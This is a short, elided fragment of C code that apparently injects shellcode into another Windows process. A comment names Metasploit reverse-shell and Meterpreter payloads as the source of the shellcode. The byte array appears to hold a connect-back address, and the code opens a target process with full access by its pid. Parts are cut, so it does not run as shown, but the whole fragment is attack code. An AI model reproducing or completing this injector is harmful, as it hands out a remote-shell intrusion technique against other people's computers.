...
// generate use windows/x64/shell_reverse_tcp or meterpreter/reverse_tcp
    char shellcode[] = {
        ...
        "\x00\x49\x89\xe5\x49\xbc\x02\x00\x23\x29\x0a\x12\x03\x1a"
    ...
    HANDLE hThread;
    void* exec_mem;
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, <pid>); // enter process pid
